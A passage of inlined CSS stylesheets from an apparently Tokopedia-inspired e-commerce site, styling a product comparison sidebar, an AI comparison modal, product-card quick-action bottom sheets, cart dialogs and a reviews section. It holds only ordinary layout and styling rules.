  -webkit-box-orient: vertical;
  overflow: hidden;
}

.compare-item-price {
  font-weight: 600;
  font-size: 0.8rem;
  color: #059669;
}

.compare-item-remove {
  flex-shrink: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 28px;
  height: 28px;
  border: none;
  border-radius: 4px;
  background: transparent;
  color: #8adeff;
  cursor: pointer;
  transition: all 0.2s ease;
}

.compare-item-remove:hover {
  background: #fef2f2;
  color: #991b1b;
}

.compare-actions {
  padding: 1rem;
  border-top: 1px solid #e2e8f0;
  display: flex;
  gap: 0.75rem;
}

.compare-actions .btn {
  flex: 1;
  padding: 0.75rem 1rem;
  border-radius: 6px;
  font-weight: 600;
  font-size: 0.875rem;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
  cursor: pointer;
  transition: all 0.2s ease;
}

.btn-outline-danger {
  border: 1px solid #8adeff;
  background: transparent;
  color: #8adeff;
}

.btn-outline-danger:hover {
  background: #8adeff;
  color: white;
}

.btn-primary {
  border: 1px solid #3b82f6;
  background: #3b82f6;
  color: white;
}

.btn-primary:hover {
  background: #2563eb;
  border-color: #2563eb;
}

.btn-primary:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.btn-primary:disabled:hover {
  background: #3b82f6;
  border-color: #3b82f6;
}

/* AI Comparison Modal */
.ai-compare-modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 10000;
  display: none;
  align-items: center;
  justify-content: center;
}

.ai-compare-modal.open {
  display: flex;
}

.ai-compare-modal .modal-backdrop {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(4px);
}

.modal-container {
  position: relative;
  width: 90%;
  max-width: 1000px;
  max-height: 90vh;
  background: #ffffff;
  border-radius: 12px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

.modal-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 1.5rem 2rem;
  border-bottom: 1px solid #e2e8f0;
  background: #f8fafc;
}

.modal-title {
  display: flex;
  align-items: center;
  gap: 0.75rem;
  font-size: 1.25rem;
  font-weight: 600;
  color: #1e293b;
  margin: 0;
}

.modal-close {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 36px;
  height: 36px;
  border: none;
  border-radius: 8px;
  background: transparent;
  color: #64748b;
  cursor: pointer;
  transition: all 0.2s ease;
}

.modal-close:hover {
  background: #e2e8f0;
  color: #374151;
}

.modal-content {
  flex: 1;
  overflow-y: auto;
  padding: 2rem;
}

/* AI Loading State */
.ai-loading {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 3rem 2rem;
  text-align: center;
}

.loading-animation {
  margin-bottom: 1rem;
}

.typing-indicator {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 4px;
  margin-bottom: 1rem;
}

.typing-indicator span {
  width: 8px;
  height: 8px;
  background: #3b82f6;
  border-radius: 50%;
  animation: typing 1.4s infinite ease-in-out;
}

.typing-indicator span:nth-child(2) {
  animation-delay: 0.2s;
}

.typing-indicator span:nth-child(3) {
  animation-delay: 0.4s;
}

@keyframes typing {
  0%, 80%, 100% {
    opacity: 0.3;
    transform: scale(0.8);
  }
  40% {
    opacity: 1;
    transform: scale(1);
  }
}

.ai-loading p {
  font-weight: 500;
  color: #1e293b;
  margin-bottom: 0.5rem;
}

.ai-loading small {
  color: #64748b;
}

/* AI Error State */
.ai-error {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 3rem 2rem;
  text-align: center;
}

.ai-error h4 {
  margin: 1rem 0 0.5rem;
  color: #8adeff;
}

.ai-error p {
  color: #64748b;
  margin-bottom: 1.5rem;
}

/* AI Results */
.ai-results > div {
  margin-bottom: 2rem;
}

.ai-summary-card,
.ai-comparison-table,
.ai-detailed-analysis,
.ai-recommendations,
.ai-tips {
  background: #f8fafc;
  border: 1px solid #e2e8f0;
  border-radius: 12px;
  padding: 1.5rem;
}

.ai-results h4 {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  font-size: 1.1rem;
  font-weight: 600;
  color: #1e293b;
  margin-bottom: 1rem;
}

.summary-text {
  font-size: 1rem;
  line-height: 1.6;
  color: #374151;
  margin-bottom: 1rem;
}

.winner-badge {
  padding: 1rem;
  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
  color: white;
  border-radius: 8px;
}

.winner-badge strong {
  display: block;
  margin-bottom: 0.25rem;
}

.winner-badge small {
  opacity: 0.9;
  font-size: 0.875rem;
}

/* Comparison Table */
.comparison-grid {
  display: grid;
  gap: 1rem;
  margin-top: 1rem;
}

.comparison-category {
  background: white;
  border: 1px solid #e2e8f0;
  border-radius: 8px;
  overflow: hidden;
}

.category-header {
  background: #f1f5f9;
  padding: 0.75rem 1rem;
  font-weight: 600;
  color: #1e293b;
  border-bottom: 1px solid #e2e8f0;
}

.category-products {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 1px;
  background: #e2e8f0;
}

.product-score {
  background: white;
  padding: 1rem;
  text-align: center;
}

.score-value {
  display: inline-flex;
  align-items: center;
  gap: 0.25rem;
  margin-bottom: 0.5rem;
}

.score-stars {
  color: #fbbf24;
}

.score-note {
  font-size: 0.8rem;
  color: #64748b;
  line-height: 1.3;
}

/* Product name header in comparison table */
.product-name-header {
  margin-bottom: 0.5rem;
}

.product-name-header strong {
  font-size: .8rem; /* h5 size (18px) */
  font-weight: 600;
  color: #1e293b;
  line-height: 1.3;
  display: block;
  word-break: break-word;
}

.product-price {
  font-size: 0.8rem;
  font-weight: 600;
  color: #059669;
}

/* Detailed Analysis */
.products-analysis {
  display: grid;
  gap: 1rem;
  margin-top: 1rem;
}

.product-analysis {
  background: white;
  border: 1px solid #e2e8f0;
  border-radius: 8px;
  padding: 1rem;
}

.product-analysis h5 {
  color: #1e293b;
  margin-bottom: 0.75rem;
  font-weight: 600;
}

.analysis-section {
  margin-bottom: 0.75rem;
}

.analysis-section:last-child {
  margin-bottom: 0;
}

.analysis-section h6 {
  font-size: 0.875rem;
  font-weight: 600;
  margin-bottom: 0.5rem;
}

.analysis-section h6.strengths {
  color: #059669;
}

.analysis-section h6.weaknesses {
  color: #8adeff;
}

.analysis-section h6.best-for {
  color: #7c3aed;
}

.analysis-section ul {
  list-style: none;
  padding: 0;
  margin: 0;
}

.analysis-section li {
  display: flex;
  align-items: flex-start;
  gap: 0.5rem;
  margin-bottom: 0.25rem;
  font-size: 0.875rem;
  line-height: 1.4;
}

.analysis-section li:before {
  content: "â€¢";
  color: #64748b;
  font-weight: bold;
  margin-top: 0.1rem;
}

.best-for-text {
  font-size: 0.875rem;
  color: #374151;
  font-style: italic;
}

/* Recommendations */
.recommendations-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 1rem;
  margin-top: 1rem;
}

.recommendation-card {
  background: white;
  border: 1px solid #e2e8f0;
  border-radius: 8px;
  padding: 1rem;
  text-align: center;
}

.recommendation-card h5 {
  font-size: 1rem;
  margin-bottom: 0.75rem;
  color: #1e293b;
}

.recommendation-card p {
  font-size: 0.875rem;
  color: #374151;
  line-height: 1.5;
}

/* Tips */
.tips-list {
  list-style: none;
  padding: 0;
  margin: 1rem 0 0 0;
}

.tips-list li {
  display: flex;
  align-items: flex-start;
  gap: 0.75rem;
  margin-bottom: 0.75rem;
  font-size: 0.9rem;
  line-height: 1.5;
  color: #374151;
}

.tips-list li:before {
  content: "ðŸ’¡";
  font-size: 1rem;
  margin-top: 0.1rem;
}

/* Modal Footer */
.modal-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 1.5rem 2rem;
  border-top: 1px solid #e2e8f0;
  background: #f8fafc;
}

.btn-outline-secondary {
  border: 1px solid #64748b;
  background: transparent;
  color: #64748b;
  padding: 0.75rem 1.5rem;
  border-radius: 6px;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 0.5rem;
  cursor: pointer;
  transition: all 0.2s ease;
}

.btn-outline-secondary:hover {
  background: #64748b;
  color: white;
}

/* Responsive for chip button */
@media (max-width: 880px) {
  .pd-compare-section {
    margin: 1rem 0;
    display: block;
  }

  .pd-compare-btn {
    width: 100%;
    font-size: 0.85rem;
    padding: 0.65rem 1rem;
    border-radius: 10px;
    justify-content: center;
    min-height: 44px;
  }
  
  .pd-compare-btn .compare-icon {
    width: 16px;
    height: 16px;
  }

  .pd-compare-info {
    margin-top: 0.5rem;
    display: block;
    text-align: center;
  }

  .compare-note {
    font-size: 0.7rem;
    display: block;
  }
}

/* Responsive Design */
@media (max-width: 768px) {
  .compare-sidebar {
    width: 100%;
    right: -100%;
    /* Fix for mobile viewport height changes */
    height: 100vh;
    height: 100dvh; /* Dynamic viewport height for modern browsers */
  }
  
  .compare-actions {
    /* Ensure actions are always visible */
    position: sticky;
    bottom: 0;
    background: white;
    border-top: 2px solid #e2e8f0;
    box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
    z-index: 10;
  }
  
  .compare-actions .btn {
    /* Larger touch targets for mobile */
    min-height: 48px;
    font-size: 0.9rem;
    font-weight: 700;
  }
  
  .modal-container {
    width: 95%;
    max-height: 95vh;
    max-height: 95dvh; /* Dynamic viewport height */
  }
  
  .modal-header,
  .modal-content,
  .modal-footer {
    padding: 1rem;
  }
  
  .recommendations-grid {
    grid-template-columns: 1fr;
  }
  
  .category-products {
    grid-template-columns: 1fr;
  }
  
  .modal-footer {
    flex-direction: column;
    gap: 0.75rem;
  }
  
  .modal-footer .btn {
    width: 100%;
  }
  
  /* Ensure compare button is visible on mobile */
  .pd-compare-section {
    display: block !important;
    visibility: visible !important;
    opacity: 1 !important;
    margin: 1rem 0;
    padding: 0;
    position: relative !important;
    z-index: 1 !important;
    max-width: 100%;
    overflow: hidden;
  }
  
  .pd-compare-btn {
    display: flex !important;
    visibility: visible !important;
    opacity: 1 !important;
    width: 100%;
    padding: 0.75rem 1rem;
    font-size: 0.9rem;
    min-height: 48px; /* Minimum touch target for mobile */
    border: 2px solid #e2e8f0 !important;
    background: #fff !important;
    position: relative !important;
    z-index: 2 !important;
    box-sizing: border-box;
    white-space: normal !important; /* Allow text wrapping on mobile */
    flex-wrap: wrap;
    gap: 0.5rem;
  }
  
  .pd-compare-btn .compare-text {
    display: inline !important;
    visibility: visible !important;
    font-weight: 600;
    color: #475569 !important;
  }
  
  .pd-compare-btn .compare-remove {
    display: none !important; /* Hidden by default */
  }
  
  .pd-compare-btn.added .compare-remove {
    display: flex !important; /* Only show when added */
    flex-wrap: wrap;
    align-items: center;
    gap: 0.4rem;
    white-space: normal !important;
    word-break: break-word;
  }
  
  .pd-compare-btn .compare-icon {
    display: inline-block !important;
    width: 18px;
    height: 18px;
    flex-shrink: 0;
  }
  
  .pd-compare-info {
    margin-top: 0.5rem;
  }
  
  .compare-note {
    font-size: 0.85rem !important;
    display: block !important;
    visibility: visible !important;
    color: #64748b !important;
  }
}

/* iOS Safari specific fixes */
@media (max-width: 480px) {
  #compareBtn { 
    width:46px;
    height:46px;
  }
  
  .pd-compare-section {
    -webkit-transform: translateZ(0);
    transform: translateZ(0);
  }
  
  .pd-compare-btn {
    -webkit-appearance: none !important;
    appearance: none !important;
    -webkit-tap-highlight-color: transparent;
    touch-action: manipulation;
  }
  
  /* Fix sidebar height for iOS address bar */
  .compare-sidebar {
    /* Use fixed positioning that accounts for iOS address bar */
    height: 100vh;
    height: -webkit-fill-available; /* iOS Safari compatibility */
    min-height: 100vh;
    min-height: -webkit-fill-available;
  }
  
  /* Ensure compare actions stay at bottom */
  .compare-actions {
    position: sticky;
    bottom: 0;
    background: white;
    border-top: 2px solid #e2e8f0;
    box-shadow: 0 -4px 12px rgba(0, 0, 0, 0.15);
    padding: 1.25rem 1rem;
    z-index: 20;
  }
  
  .compare-actions .btn {
    min-height: 52px; /* Larger for easier tapping */
    font-size: 1rem;
    font-weight: 700;
    border-radius: 8px;
  }
  
  /* Adjust content padding to account for sticky actions */
  .compare-content {
    padding-bottom: 6rem; /* Extra space for sticky actions */
  }
}

/* High-resolution mobile devices (iPhone 12 Pro, etc.) */
@media (-webkit-min-device-pixel-ratio: 2) and (max-width: 430px) {
  .pd-compare-section {
    display: block !important;
  }
  
  .pd-compare-btn {
    display: flex !important;
    min-height: 44px;
    font-size: 16px; /* Prevent zoom on iOS */
  }
  
  /* Enhanced fixes for iPhone 12 Pro and similar devices */
  .compare-sidebar {
    /* Ensure full height coverage */
    height: 100vh;
    height: 100dvh; /* Dynamic viewport height */
    height: -webkit-fill-available; /* iOS fallback */
    max-height: 100vh;
    max-height: 100dvh;
    max-height: -webkit-fill-available;
    overflow: hidden; /* Prevent scroll issues */
  }
  
  .compare-content {
    /* Flexible content area */
    flex: 1;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
    padding: 1rem 1rem 8rem 1rem; /* Extra bottom padding */
  }
  
  .compare-actions {
    /* Force actions to stay visible */
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    width: 100%;
    background: white;
    border-top: 2px solid #e2e8f0;
    box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.2);
    padding: 1rem;
    z-index: 9999;
    display: flex !important;
    gap: 0.75rem;
  }
  
  .compare-actions .btn {
    flex: 1;
    min-height: 30px; /* Extra large for high-DPI screens */
    font-size: .8rem;
    font-weight: 600;
    border-radius: 12px;
    display: flex !important;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
  }
  
  /* Ensure AI analyze button is always visible and prominent */
  #compareAnalyze {
    background: #3b82f6 !important;
    border-color: #3b82f6 !important;
    color: white !important;
    box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
  }
  
  #compareAnalyze:not(:disabled) {
    background: #2563eb !important;
    border-color: #2563eb !important;
    transform: scale(1.02);
  }
  
  #compareAnalyze:disabled {
    opacity: 0.6 !important;
    background: #9ca3af !important;
    border-color: #9ca3af !important;
  }
}

/* AI Disclaimer Styles */
.ai-disclaimer {
  display: flex;
  align-items: flex-start;
  gap: 0.75rem;
  padding: 1rem;
  background: #fef3c7;
  border: 1px solid #fbbf24;
  border-radius: 8px;
  margin: 0;
}

.disclaimer-icon {
  font-size: 1.25rem;
  flex-shrink: 0;
  margin-top: 0.125rem;
}

.disclaimer-text {
  font-size: 0.85rem;
  line-height: 1.4;
  color: #92400e;
}

.disclaimer-text strong {
  color: #78350f;
  font-weight: 600;
}

/* Compare Disclaimer in Sidebar */
.compare-disclaimer {
  margin-top: 1rem;
  padding: 1rem;
  background: #f0f9ff;
  border: 1px solid #0ea5e9;
  border-radius: 8px;
}

.compare-disclaimer h6 {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  font-size: 0.875rem;
  font-weight: 600;
  color: #0c4a6e;
  margin-bottom: 0.5rem;
}

.compare-disclaimer p {
  font-size: 0.8rem;
  line-height: 1.4;
  color: #075985;
  margin-bottom: 0.5rem;
}

.compare-disclaimer p:last-child {
  margin-bottom: 0;
}

.compare-disclaimer ul {
  list-style: none;
  padding: 0;
  margin: 0.5rem 0 0 0;
}

.compare-disclaimer li {
  display: flex;
  align-items: flex-start;
  gap: 0.5rem;
  margin-bottom: 0.25rem;
  font-size: 0.75rem;
  line-height: 1.3;
  color: #075985;
}

.compare-disclaimer li:before {
  content: "â€¢";
  color: #0ea5e9;
  font-weight: bold;
  margin-top: 0.1rem;
  flex-shrink: 0;
}

/* Mobile Browser Address Bar Fixes */
@supports (height: 100dvh) {
  /* Modern browsers with dynamic viewport support */
  @media (max-width: 768px) {
    .compare-sidebar {
      height: 100dvh !important;
      max-height: 100dvh !important;
    }
    
    .modal-container {
      max-height: 95dvh !important;
    }
  }
}

@supports (height: -webkit-fill-available) {
  /* iOS Safari specific support */
  @media (max-width: 768px) {
    .compare-sidebar {
      height: -webkit-fill-available !important;
      max-height: -webkit-fill-available !important;
    }
  }
}

/* Fallback for older browsers */
@media (max-width: 768px) and (orientation: portrait) {
  .compare-sidebar {
    /* Fixed height that works across different mobile browsers */
    min-height: 600px;
    height: calc(100vh - env(keyboard-inset-height, 0px));
    height: calc(100vh - env(safe-area-inset-bottom, 0px));
  }
  
  /* Ensure actions are always accessible */
  .compare-actions {
    position: sticky !important;
    bottom: env(safe-area-inset-bottom, 0px) !important;
    margin-bottom: 0 !important;
    padding-bottom: calc(1rem + env(safe-area-inset-bottom, 0px)) !important;
  }
}

/* PWA and fullscreen app support */
@media (display-mode: standalone) {
  .compare-sidebar {
    height: 100vh !important;
    height: 100dvh !important;
  }
}

/* Utilities */
.btn-sm {
  padding: 0.5rem 0.75rem;
  font-size: 0.8rem;
}

[hidden] {
  display: none !important;
}

/* ===== UX ENHANCEMENTS ===== */

/* Compare Button Highlight Animation */
.pulse-highlight {
  animation: pulse-glow 2s ease-in-out 3;
  box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7);
}

@keyframes pulse-glow {
  0% {
    box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7);
  }
  50% {
    box-shadow: 0 0 0 10px rgba(59, 130, 246, 0);
  }
  100% {
    box-shadow: 0 0 0 0 rgba(59, 130, 246, 0);
  }
}

/* Flying Product Animation */
.flying-product {
  position: fixed;
  z-index: 9999;
  pointer-events: none;
}

.flying-product img {
  border-radius: 8px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
}

/* Sticky Compare Bar - REMOVED (using only fly-to-navbar animation) */

/* Inline Compare Preview - REMOVED (keeping it simple and clean) */
</style>
  <style data-inlined="product-card-actions.css">
/**
 * Product Card Quick Actions - 3 Dot Menu + Bottom Sheet
 * Tokopedia-inspired design
 */

/* ===== 3 Dot Button on Product Card ===== */
.prod-card {
    position: relative;
}

.prod-card-actions-btn {
    position: absolute;
    top: 8px;
    right: 8px;
    width: 32px;
    height: 32px;
    border-radius: 50%;
    background: rgba(255, 255, 255, 0.95);
    border: 1px solid rgba(0, 0, 0, 0.08);
    display: inline-flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 3;
    transition: all 0.2s ease;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    -webkit-tap-highlight-color: transparent;
}

.prod-card-actions-btn:hover {
    background: #fff;
    border-color: rgba(0, 0, 0, 0.15);
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.05);
}

.prod-card-actions-btn:active {
    transform: scale(0.95);
}

.prod-card-actions-btn svg {
    width: 20px;
    height: 20px;
    color: #64748b;
    display: block;
}

/* Desktop: Show on hover */
@media (min-width: 641px) {
    .prod-card-actions-btn {
        opacity: 0;
        pointer-events: none;
    }
    
    .prod-card:hover .prod-card-actions-btn {
        opacity: 1;
        pointer-events: auto;
    }
}

/* Mobile: Always visible but smaller */
@media (max-width: 640px) {
    .prod-card-actions-btn {
        width: 28px;
        height: 28px;
        top: 6px;
        right: 6px;
        opacity: 95%;
    }
    
    .prod-card-actions-btn svg {
        width: 18px;
        height: 18px;
    }
}

/* ===== Bottom Sheet Overlay ===== */
.pca-overlay {
    position: fixed;
    inset: 0;
    background: rgba(15, 23, 42, 0.6);
    backdrop-filter: blur(4px);
    z-index: 99998;
    opacity: 0;
    visibility: hidden;
    transition: all 0.3s ease;
}

.pca-overlay.active {
    opacity: 1;
    visibility: visible;
}

/* ===== Bottom Sheet Container ===== */
.pca-bottom-sheet {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    background: #fff;
    border-radius: 20px 20px 0 0;
    box-shadow: 0 -4px 24px rgba(0, 0, 0, 0.15);
    z-index: 99999;
    max-width: 600px;
    margin: 0 auto;
    transform: translateY(100%);
    transition: transform 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
}

.pca-bottom-sheet.active {
    transform: translateY(0);
}

/* Drag Handle */
.pca-sheet-handle {
    width: 40px;
    height: 4px;
    background: #cbd5e1;
    border-radius: 999px;
    margin: 12px auto 8px;
}

/* Product Preview */
.pca-sheet-product {
    display: flex;
    gap: 12px;
    padding: 12px 20px;
    border-bottom: 1px solid #f1f5f9;
}

.pca-product-image {
    width: 60px;
    height: 60px;
    border-radius: 8px;
    object-fit: cover;
    flex-shrink: 0;
    border: 1px solid #e2e8f0;
}

.pca-product-info {
    flex: 1;
    min-width: 0;
}

.pca-product-name {
    font-size: 14px;
    font-weight: 600;
    color: #0f172a;
    margin: 0 0 4px 0;
    display: -webkit-box;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
    overflow: hidden;
    line-height: 1.3;
}

.pca-product-price {
    font-size: 15px;
    font-weight: 700;
    color: #0ea5e9;
    margin: 0;
}

.pca-product-stock {
    font-size: 12px;
    color: #64748b;
    margin: 2px 0 0 0;
}

.pca-product-stock.in {
    color: #16a34a;
}

.pca-product-stock.low {
    color: #ea580c;
}

.pca-product-stock.out {
    color: #8adeff;
}

/* Action Menu */
.pca-sheet-actions {
    padding: 8px 0 20px;
}

.pca-action-item {
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 16px 20px;
    background: transparent;
    border: 0;
    width: 100%;
    cursor: pointer;
    transition: background-color 0.15s ease;
    -webkit-tap-highlight-color: transparent;
}

.pca-action-item:hover {
    background: #f8fafc;
}

.pca-action-item:active {
    background: #f1f5f9;
}

.pca-action-item:disabled {
    opacity: 0.4;
    cursor: not-allowed;
}

.pca-action-item:disabled:hover {
    background: transparent;
}

.pca-action-icon {
    width: 24px;
    height: 24px;
    color: #475569;
    flex-shrink: 0;
}

.pca-action-content {
    flex: 1;
    text-align: left;
}

.pca-action-label {
    font-size: 15px;
    font-weight: 600;
    color: #0f172a;
    margin: 0 0 2px 0;
}

.pca-action-desc {
    font-size: 12px;
    color: #64748b;
    margin: 0;
}

.pca-action-badge {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    min-width: 20px;
    height: 20px;
    padding: 0 6px;
    background: #0ea5e9;
    color: #fff;
    font-size: 11px;
    font-weight: 700;
    border-radius: 999px;
    margin-left: auto;
}

.pca-action-badge.compare {
    background: #8b5cf6;
}

/* Action Item Colors */
.pca-action-item.cart .pca-action-icon {
    color: #0ea5e9;
}

.pca-action-item.compare .pca-action-icon {
    color: #8b5cf6;
}

.pca-action-item.compare.active {
    background: rgba(139, 92, 246, 0.05);
}

.pca-action-item.compare.active .pca-action-label {
    color: #8b5cf6;
}

.pca-action-item.compare.active .pca-action-icon {
    color: #8b5cf6;
}

.pca-action-item.share .pca-action-icon {
    color: #64748b;
}

/* Loading State */
.pca-action-item.loading {
    pointer-events: none;
}

.pca-action-item.loading .pca-action-icon {
    animation: spin 1s linear infinite;
}

@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

/* Success State Animation */
.pca-action-item.success .pca-action-icon {
    animation: checkmark 0.5s ease;
}

@keyframes checkmark {
    0% { transform: scale(0); }
    50% { transform: scale(1.2); }
    100% { transform: scale(1); }
}

/* ===== Safe Area for Mobile Devices ===== */
@supports (padding-bottom: env(safe-area-inset-bottom)) {
    .pca-sheet-actions {
        padding-bottom: calc(20px + env(safe-area-inset-bottom));
    }
}

/* ===== Responsive Tweaks ===== */
@media (max-width: 640px) {
    .pca-bottom-sheet {
        border-radius: 16px 16px 0 0;
    }
    
    .pca-sheet-product {
        padding: 10px 16px;
    }
    
    .pca-product-image {
        width: 50px;
        height: 50px;
    }
    
    .pca-product-name {
        font-size: 13px;
    }
    
    .pca-product-price {
        font-size: 14px;
    }
    
    .pca-action-item {
        padding: 14px 16px;
        gap: 12px;
    }
    
    .pca-action-icon {
        width: 22px;
        height: 22px;
    }
    
    .pca-action-label {
        font-size: 14px;
    }
}

/* ===== Animation for Flying Product ===== */
.flying-product {
    position: fixed;
    pointer-events: none;
    z-index: 99999;
    animation: fadeOut 0.8s ease forwards;
}

@keyframes fadeOut {
    to {
        opacity: 0;
        transform: scale(0.5);
    }
}

/* ===== Desktop Dropdown (Alternative) ===== */
@media (min-width: 1024px) {
    /* Optional: Could add desktop dropdown menu here */
    /* For now, using bottom sheet for consistency */
}

/* ===== Print Styles ===== */
@media print {
    .prod-card-actions-btn,
    .pca-overlay,
    .pca-bottom-sheet {
        display: none !important;
    }
}

</style>
  <style data-inlined="modal.css">
/* Modern Modal Dialog for Cart Operations */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  backdrop-filter: blur(4px);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  opacity: 0;
  visibility: hidden;
  transition: all 0.2s ease;
}

.modal-overlay.show {
  opacity: 1;
  visibility: visible;
}

.modal-dialog {
  background: white;
  border-radius: 16px;
  box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
  max-width: 400px;
  width: 90%;
  max-height: 90vh;
  overflow-y: auto;
  transform: scale(0.95);
  transition: transform 0.2s ease;
}

.modal-overlay.show .modal-dialog {
  transform: scale(1);
}

.modal-header {
  padding: 24px 24px 16px;
  border-bottom: 1px solid #f1f5f9;
}

.modal-title {
  font-size: 20px;
  font-weight: 700;
  color: #0f172a;
  margin: 0;
  display: flex;
  align-items: center;
  gap: 12px;
}

.modal-body {
  padding: 16px 24px 24px;
}

.modal-message {
  font-size: 16px;
  line-height: 1.5;
  color: #475569;
  margin: 0;
}

.modal-actions {
  display: flex;
  gap: 12px;
  margin-top: 24px;
}

.modal-btn {
  flex: 1;
  padding: 12px 16px;
  border: none;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
  text-align: center;
}

.modal-btn-secondary {
  background: #f8fafc;
  color: #64748b;
  border: 1px solid #e2e8f0;
}

.modal-btn-secondary:hover {
  background: #f1f5f9;
  border-color: #cbd5e1;
}

.modal-btn-danger {
  background: #8adeff;
  color: white;
}

.modal-btn-danger:hover {
  background: #8adeff;
}

.modal-btn-primary {
  background: #3b82f6;
  color: white;
}

.modal-btn-primary:hover {
  background: #2563eb;
}

.modal-icon {
  font-size: 24px;
  width: 32px;
  height: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 8px;
}

.modal-icon.danger {
  background: #fef2f2;
  color: #8adeff;
}

.modal-icon.warning {
  background: #fffbeb;
  color: #f59e0b;
}

.modal-icon.success {
  background: #f0fdf4;
  color: #22c55e;
}

.modal-icon.info {
  background: #eff6ff;
  color: #3b82f6;
}

/* Mobile responsive */
@media (max-width: 640px) {
  .modal-dialog {
    margin: 16px;
    max-width: none;
    width: auto;
  }
  
  .modal-header,
  .modal-body {
    padding-left: 20px;
    padding-right: 20px;
  }
  
  .modal-actions {
    flex-direction: column;
  }
  
  .modal-btn {
    flex: none;
  }
}
</style>
      
        <style data-inlined="reviews-points.css">
/**
 * Reviews & Points System - Styles
 * Product reviews, rating display, and point redemption UI
 */

/* ===================================
   PRODUCT REVIEWS
   =================================== */

.product-tabs {
  display: flex;
  border-bottom: 2px solid #e5e7eb;
  margin: 24px 0 16px;
  gap: 8px;
}

.tab-btn {
  padding: 12px 20px;
  border: none;
  background: none;
  cursor: pointer;
  font-size: 15px;
  font-weight: 500;
  color: #6b7280;
  border-bottom: 3px solid transparent;
  transition: all 0.2s ease;
  position: relative;
  top: 2px;
}

.tab-btn:hover {
  color: #111827;
}

.tab-btn.active {
  color: #2563eb;
  border-bottom-color: #2563eb;
}

.tab-content {
  padding: 20px 0;
}

/* Review Statistics */
.review-stats {
  display: grid;
  grid-template-columns: 200px 1fr;
  gap: 32px;
  padding: 24px;
  background: #f9fafb;
  border-radius: 12px;
  margin-bottom: 24px;
}

.rating-summary {
  text-align: center;
}

.avg-rating {
  display: block;
  font-size: 48px;
  font-weight: 700;
  color: #111827;
  line-height: 1;
}

.rating-summary .stars {
  font-size: 24px;
  color: #fbbf24;
  margin: 8px 0;
}

.total-reviews {
  display: block;
  font-size: 14px;
  color: #6b7280;
  margin-top: 4px;
}

.rating-breakdown {
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.rating-bar {
  display: flex;
  align-items: center;
  gap: 12px;
}

.rating-label {
  font-size: 14px;
  color: #374151;
  width: 32px;
  text-align: right;
}

.bar-container {
  flex: 1;
  height: 8px;
  background: #e5e7eb;
  border-radius: 4px;
  overflow: hidden;
}

.bar-fill {
  height: 100%;
  background: linear-gradient(90deg, #fbbf24 0%, #f59e0b 100%);
  transition: width 0.3s ease;
}

.rating-count {
  font-size: 14px;
  color: #6b7280;
  width: 40px;
  text-align: right;
}

/* Review Filters */
.review-filters {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}

.review-sort {
  padding: 8px 12px;
  border: 1px solid #d1d5db;
  border-radius: 8px;
  font-size: 14px;
  background: white;
}

.write-review-btn {
  padding: 10px 20px;
  background: #2563eb;
  color: white;
  border: none;
  border-radius: 8px;
  font-weight: 500;
  cursor: pointer;
  transition: background 0.2s;
}

.write-review-btn:hover {
  background: #1d4ed8;
}

/* Review List */
.reviews-list {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.review-item {
  padding: 20px;
  background: white;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  transition: box-shadow 0.2s;
}

.review-item:hover {
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
}

.review-header {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  margin-bottom: 8px;
}

.review-author {
  display: flex;
  align-items: center;
  gap: 8px;
}

.review-author strong {
  font-size: 15px;
  color: #111827;
}

.verified-badge {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-size: 12px;
  color: #059669;
  background: #d1fae5;
  padding: 2px 8px;
  border-radius: 4px;
  font-weight: 500;
}

.anonymous-badge {
